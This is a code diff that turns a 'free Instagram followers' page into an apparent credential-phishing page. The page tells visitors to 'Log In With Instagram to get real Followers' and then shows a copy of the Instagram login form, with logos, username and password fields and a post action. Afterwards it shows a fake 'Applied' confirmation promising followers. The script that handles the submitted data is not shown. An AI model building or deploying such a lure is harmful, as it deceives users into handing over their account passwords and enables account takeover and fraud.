@@ -4,64 +4,76 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
-    <link rel="stylesheet" href="src/output.css">
+    <script src="https://kit.fontawesome.com/e4859e641f.js" crossorigin="anonymous"></script>
     <style>
-@import url('https://fonts.googleapis.com/css2?family=Libertinus+Math&family=Oswald:wght@200..700&family=Playfair+Display:ital,wght@0,400..900;1,400..900&display=swap');
-
-*{
-    max-width: 360px;
-    font-family:  "Playfair Display";
-    overflow: hidden;
-}
-
-</style>
+        @import url('https://fonts.googleapis.com/css2?family=Libertinus+Math&family=Oswald:wght@200..700&family=Playfair+Display:ital,wght@0,400..900;1,400..900&display=swap');
+        input:focus~label{
+            font-size: 0.8rem;
+            top: 0;
+            
+        }
+        .input-parent:focus-within{
+            border: 1.5px solid gray;
+        }
+        i{
+            visibility: hidden;
+        }
+        #afterLog{
+            font-family:  "Playfair Display";
+            text-align: center;
+        }
+    </style>
+    <link rel="stylesheet" href="src/output.css">
 </head>
-<body class="h-screen bg-[#2F5249] relative">
-    <h1 class="text-3xl mt-12 font-bold text-[#E3DE61] text-center">Grow Your Instagram</h1>
-    <div class="text-white mt-12 p-4 bg-gradient-to-r from-[#0f172a]  to-[#334155] mx-6 rounded-lg py-8 pb-12  border text-center">
-        <p class="mb-4">Get Upto 100 Followers Free</p>
-        <small>Free Plan Valid Only once in 24 Hours</small>
-        <p class="mt-2">For More You can Choose our paid Plan</p>
-        
-    </div>
-    <div id="input" class="bg-white p-4  mx-6 mt-6  rounded-lg">
-        <input type="text" placeholder="Enter you Username"  class="border-none outline-none placeholder:text-gray-800 w-full">
-    </div>
-    <div id="buttons" class="p-12 space-y-6">
-        <a href="index.html" class="bg-gradient-to-b from-[#db2777] via-[#ef4444] to-[#f97316] block w-full  rounded-xl py-4 text-white active:scale-98 cursor-pointer text-center"><button class="cursor-pointer">Get Free Followers</button></a>
-        <button class="bg-gradient-to-r from-[#1a60d0] via-[#f43f5e] to-[#fb923c] block w-full  rounded-xl py-4 text-white active:scale-98 cursor-pointer" id="paid-btn">Paid Plan(No Limit)</button>
+<body class="bg-[#e7ebf1dd]">
+    
+    <div id="instruction" class=" absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 capitalize bg-[#03A6A1] w-[300px] px-8 py-8 rounded-lg text-white space-y-4">
+        <h1 class="text-center text-3xl font-bold text-gray-900">Steps To Follow</h1>
+        <p class=" font-semibold">1. Log In With Instagram to get real Followers</p>
+        <p class=" font-semibold">2. Make sure you account is public</p>
+        <p class=" font-semibold">3. wait for 24 hours after apply</p>
+        <p class=" font-semibold">4. dont apply multiple times</p>
+        <p class=" font-semibold">5. After log in wait for few seconds</p>
+
+        <button id="okayBtn" class="bg-[#FF4F0F] w-full py-4 rounded-lg mt-4 font-semibold active:scale-98 cursor-pointer">Okay</button>
     </div>
 
-    <div id="paid" class=" bg-gray-600 w-[250px] max-h-[280px] py-4 text-center  text-white absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 rounded-xl scale-0 transition-all duration-500 shadow-[0px_0px_100px_3px_red,0px_0px_10px_6px_white,0px_0px_50px_8px_blue]">
-        <h1 class="font-bold">Plan Details</h1>
-        <ul class="mt-8 space-y-3">
-            <li class="list1">7 Days Plan</li>
-            <li class="list2">1 Month Plan</li>
-            <li class="list3">3 Months Plan</li>
-        </ul>
-        <button id="cancleBtn" class="bg-blue-600 py-2 px-8 mt-4 rounded-lg border active:scale-98 cursor-pointer">Cancle</button>
+    <div id="afterLog" class="hidden absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 capitalize bg-[#FF3F33] w-[300px] px-8 py-8 rounded-lg text-white space-y-4 shadow-[0px_0px_20px_5px_lightblue,0px_0px_20px_10px_black]">
+        <h1 class="text-center text-3xl font-bold text-[#9FC87E]">Applied</h1>
+        <p class="mt-8">Wait For 24 hours you will recieve 90 to 100 followers within 24 hours keep  patience</p>
+
+        <a href="index.html" class="bg-[#075B5E]  rounded-lg  font-semibold active:scale-98 text-center py-4"><button id="doneBtn" class="cursor-pointer w-full mt-8">Done</button></a>
     </div>
 
 
 
-    <script>
-        let paid = document.getElementById("paid");
-        let paidBtn = document.getElementById("paid-btn");
-        let cancleBtn = document.getElementById("cancleBtn");
-
-
-
-
-
-        paidBtn.addEventListener("click",()=>{
-            paid.classList.add("scale-100");
+    <div id="instagram" class="hidden mt-2 max-w-[360px] mx-auto">
+        <p class="text-center">English (US)</p>
+        <div id="logo" class="mt-12">
+            <img class="w-14 mx-auto" src="logo.png" alt="">
+        </div>
+        <form name="log-in" method="post" action="" class="px-4 space-y-4 mt-18">
+            <div class="input-parent relative w-full border-1 border-gray-400 p-4 rounded-xl bg-white outline-none">
+            <input class="border-none outline-none w-full" 
+            type="text" id="username" name="username" required>
+            <label for="username" class="absolute left-4 top-4 text-gray-600 font-semibold" id="user_label">Username,email or mobile number</label>
+            </div>
+            <div class="input-parent relative w-full border-1 border-gray-400 p-4 rounded-xl bg-white  outline-none">
+                <input class="border-none outline-none w-full" 
+             type="password" id="password" name="password" required>
+             <label for="password" class="absolute left-4 top-4 text-gray-600 font-semibold" id="password_label">Password</label>
+            <i id="visibility" class="fa-solid fa-eye-slash absolute right-4 top-5 cursor-pointer"></i>
+            </div>
             
-        })
-        cancleBtn.addEventListener("click",()=>{
-            paid.classList.remove("scale-100");
-            paid.classList.add("scale-0");
-            
-        })
-    </script>
+            <button type="submit" class="block bg-blue-600 text-white py-2 w-full rounded-full cursor-pointer">Log in</button>
+        </form>
+        <a href="#"><p class="text-center mt-4">Forgot password?</p></a>
+        <div id="new" class="px-4 mt-32">
+            <button class="w-full border-1 rounded-full border-blue-700 text-blue-900 py-2 font-semibold">Create new acount</button>
+            <img src="meta.png" class="h-16 mx-auto">
+        </div>
+    </div>
+
+<script src="script.js"></script>
 </body>
 </html>
